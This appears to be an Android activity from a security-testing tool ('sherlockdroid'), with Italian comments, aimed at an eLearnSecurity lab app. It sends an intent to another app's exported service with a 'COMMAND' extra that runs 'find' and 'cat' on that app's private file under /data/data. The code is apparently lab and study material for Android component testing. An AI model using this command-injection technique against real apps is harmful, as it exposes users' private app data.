package com.example.sherlockdroid.tools;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.widget.TextView;

import com.example.sherlockdroid.R;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import com.example.sherlockdroid.config.Config;

//TODO: Sistemare la parte relativa al catturare i log di un altra applicazione
public class ExportedService extends Activity {
    Config configurazione= new Config();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.servicexported);
        String PACKAGE = getIntent().getStringExtra("Package");
        String Service= getIntent().getStringExtra("Service");
        Log.v("PACKAGE",PACKAGE);
        Log.v("Service",Service);
        String Service2="com.elearnsecurity.sillyservice/.SillyService";
        /*
        1 Tentativo
        Intent serviceIntent=new Intent(Service);
        serviceIntent.setPackage(PACKAGE); //necessita che l'intento sia esplicito quando si lavora con i service

        serviceIntent.putExtra("COMMAND","find /data/data/com.elearnsecurity.sillyservice/files/private.txt");
        startService(serviceIntent);
        */
        Intent serviceIntent= new Intent();

        serviceIntent.setClassName(PACKAGE, Service);

        //TODO Questo sarebbe il comando da modificare!!!!
        String command="find /data/data/"+ PACKAGE + "/files/private.txt && cat /data/data/"+ PACKAGE +"/files/private.txt ";
        serviceIntent.putExtra("COMMAND",command);
        startService(serviceIntent);


        //String secret = serviceIntent.getStringExtra(command);
        //TextView testo_result= (TextView) findViewById(R.id.resultService);
        //testo_result.setText(secret);
        //String log= getAdbLogCat();
        //Log.v("LOGGG",log);

    }



}
